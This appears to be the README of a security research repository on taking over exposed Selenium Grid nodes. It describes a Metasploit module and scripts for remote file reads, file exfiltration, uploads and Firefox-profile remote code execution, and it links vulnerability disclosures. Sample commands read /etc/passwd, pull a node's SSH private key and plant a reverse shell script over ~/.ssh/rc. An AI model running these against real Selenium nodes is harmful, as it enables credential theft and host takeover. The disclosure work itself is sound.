## Metasploit Exploits
This combines some of the examples below to upload files to, download files from, and execute code on a Selenium node (via the “COMMAND_TYPE” param). RCE currently only works on Linux. To install, copy this to "~/.msf4/modules/exploits/multi/http/" or whatever. 
- [metasploit_exploits/selenium_node_takeover_kit.rb](metasploit_exploits/selenium_node_takeover_kit.rb)

## Misc Examples
### Catting a Remote file
This simply surfs to the "file:" url and dumps the page contents. 
- [examples/selenium_node_cat.py](examples/selenium_node_cat.py)
- [examples/selenium_node_cat.rb](examples/selenium_node_cat.rb)
<br />Example: `examples/selenium_node_cat.py -h http://selenium-hub.lan:4444/wd/hub -r /etc/passwd`

### Downloading a Remote file from a node.
This using inline HTML to create an inline form with a file upload input. It then sends a local file location into this form. Java-script in this form embeds this base64 encoded file into the same page. This is then read and decoded by the scripts, and saved to a local file.
- [examples/selenium_node_download.py](examples/selenium_node_download.py)
- [examples/selenium_node_download.rb](xamples/selenium_node_download.rb)
<br />Example: `examples/selenium_node_download.py -h http://selenium-hub.lan:4444/wd/hub -r ~/.ssh/id_rsa -l ./nodes_rsa`

### Iterating the File System
Like the Node Download scripts, but not bothering with processing the file in Java-script. If the file doesn't exist, the script, the send_keys() will throw an exception.
- [examples/selenium_node_iterate_fs.py](examples/selenium_node_iterate_fs.py)

### Remote Code Execution
Firefox only. Uses a Firefox Profile (which is just a base64 encoded zip file embedded in an Selenium API hit) to create a custom handler (“application/sh” to /bin/sh in this case). It then base64 encodes some shell commands and uses inline “data:” to pass in commands associated with “application/sh”. Firefox will then create a temp file with the commands and execute it with sh.
- [examples/selenium_node_rce.rb](examples/selenium_node_rce.rb)

### Uploading a file to a Remote node.
Firefox only. Uses a Firefox Profile to set a custom download directory and turn off the "Save as" prompt. Then surfs to inline HTML with and embedded "data:" link which is the encoded file to upload. This link is then clicked on.
- [examples/selenium_node_upload.py](examples/selenium_node_upload.py)
- [examples/selenium_node_upload.rb](examples/selenium_node_upload.rb)
<br />Example: `examples/selenium_node_upload.py -h http://selenium-hub.lan:4444/wd/hub -r ~/.ssh/rc -l ./reverse_shell.sh`

### Uploading a file to a Remote node via a profile.
Firefox only. Uses a Filefox Profile, which isnt safely unzipped, to write a file to the Node's filesystem.
- [examples/selenium_node_upload_profile.rb](examples/selenium_node_upload_profile.rb)

## Other Links:
- https://www.exploit-db.com/exploits/49915 - Exploit Database link for RCE example.
- https://github.com/SeleniumHQ/selenium/issues/8704 - Disclosure of file upload and download vulnerabilities to Selenium.
- https://github.com/SeleniumHQ/selenium/issues/9527 - Disclosure of unsafe unzip of Firefox profiles to Selenium.
- https://github.com/SeleniumHQ/selenium/issues/9526 - Disclosure of remote code execution via Firefox Profiles to Selenium.
